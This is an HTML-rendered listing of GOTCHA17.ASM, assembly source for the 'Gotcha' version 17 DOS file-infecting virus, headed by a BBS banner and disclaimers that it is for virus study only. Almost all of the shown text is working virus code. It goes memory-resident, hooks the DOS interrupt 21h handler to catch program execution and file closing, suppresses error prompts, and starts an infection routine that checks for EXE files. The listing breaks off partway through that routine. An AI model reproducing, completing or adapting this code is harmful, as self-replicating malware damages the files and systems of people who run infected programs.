<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>GOTCHA17.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=] For All Your H/P/A/V Files [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]    SysOp: Peter Venkman    [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;</span><span class="sc0">
</span><span class="sc1">; Around Among the General Public. It Will be Very Useful for Learning how   ;</span><span class="sc0">
</span><span class="sc1">; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;</span><span class="sc0">
</span><span class="sc1">; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;</span><span class="sc0">
</span><span class="sc1">; Experience can Turn it Into a far More Malevolent Program Than it Already  ;</span><span class="sc0">
</span><span class="sc1">; Is. Keep This Code in Responsible Hands!                                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*  Gotcha    version 17</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*  Compile with MASM 4.0</span><span class="sc0">
</span><span class="sc1">;*  (other assemblers will probably not produce the same result)</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*  Disclaimer:</span><span class="sc0">
</span><span class="sc1">;*  This file is only for educational purposes. The author takes no</span><span class="sc0">
</span><span class="sc1">;*  responsibility for anything anyone does with this file. Do not</span><span class="sc0">
</span><span class="sc1">;*  modify this file!</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

                </span><span class="sc9">.RADIX</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">cseg</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cseg</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">cseg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">


</span><span class="sc5">VERSION</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">17d</span><span class="sc0">
</span><span class="sc5">FILELEN</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">RESPAR</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">FILELEN</span><span class="sc4">/</span><span class="sc2">16d</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18d</span><span class="sc0">
</span><span class="sc5">BUFLEN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">ENVLEN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">signature</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">envstring</span><span class="sc0">        
</span><span class="sc5">COMSIGN</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXESIGN</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Dummy program (infected)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0100</span><span class="sc0">

</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BUFLEN</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;jump to virus entry</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Data</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0103</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">                </span><span class="sc1">;original code</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">BUFLEN</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">comexe</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">COMSIGN</span><span class="sc0">                 </span><span class="sc1">;dummy program is a COM program</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Install the virus</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">start2</span><span class="sc0">
</span><span class="sc5">start2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">BUFLEN</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;si = begin virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">BUFLEN</span><span class="sc4">],</span><span class="sc5">COMSIGN</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">entryC</span><span class="sc0">

</span><span class="sc5">entryE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;calculate CS</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;push new CS on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;push new IP on stack</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">entcheck</span><span class="sc0">

</span><span class="sc5">entryC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;push new CS on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;push new IP on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;restore old file-begin</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">entcheck</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DADA</span><span class="sc0">                </span><span class="sc1">;already installed?</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0A5</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">entstop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3000</span><span class="sc0">                 </span><span class="sc1">;test DOS version &gt;= 3.1?</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">030A</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">entstop</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;adjust memory-size</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc2">5A</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">cancel</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc5">RESPAR</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">cancel</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0012</span><span class="sc4">],</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc5">RESPAR</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0012</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;copy program to top</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FILELEN</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;get original int21 vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;move it to the end</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;set vector to new handler</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ni21</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">cancel</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">entstop</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CBh</span><span class="sc0">                    </span><span class="sc1">;retf</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Interupt 24 handler</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">ni24</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Interupt 21 handler</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">ni21</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DADA</span><span class="sc0">                </span><span class="sc1">;install-check ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_DADA</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3E</span><span class="sc0">                   </span><span class="sc1">;close ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">vvv</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc0">                   </span><span class="sc1">;duplicate handle</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">doit</span><span class="sc0">

</span><span class="sc5">vvv</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00</span><span class="sc0">                 </span><span class="sc1">;execute ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">                  </span><span class="sc1">;open the file</span><span class="sc0">

</span><span class="sc5">doit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">org21</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oi21</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;call to old int-handler</span><span class="sc0">


</span><span class="sc5">do_DADA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A500</span><span class="sc4">+</span><span class="sc5">VERSION</span><span class="sc0">        </span><span class="sc1">;return a signature</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Close the file</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3E</span><span class="sc0">                   </span><span class="sc1">;close the file</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">org21</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Tries to infect the file (ptr to ASCIIZ-name is DS:DX)</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62</span><span class="sc0">                   </span><span class="sc1">;get segment-adres of PSP</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;get seg-adres of environment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">002C</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                
</span><span class="sc5">envloop</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">envstring</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;check the environment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ENVLEN</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">                   </span><span class="sc1">;exit if item found</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;goto next item</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;finnished environment?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">envloop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3300</span><span class="sc0">                 </span><span class="sc1">;get ctrl-break flag</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">;clear the flag</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524</span><span class="sc0">                 </span><span class="sc1">;get int24 vector</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ni24</span><span class="sc0">          </span><span class="sc1">;set int24 vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220</span><span class="sc0">                 </span><span class="sc1">;get file-table entry</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2F</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2F</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;save attribute &amp; open-mode</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">   </span><span class="sc1">;check extension</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_exe</span><span class="sc0">
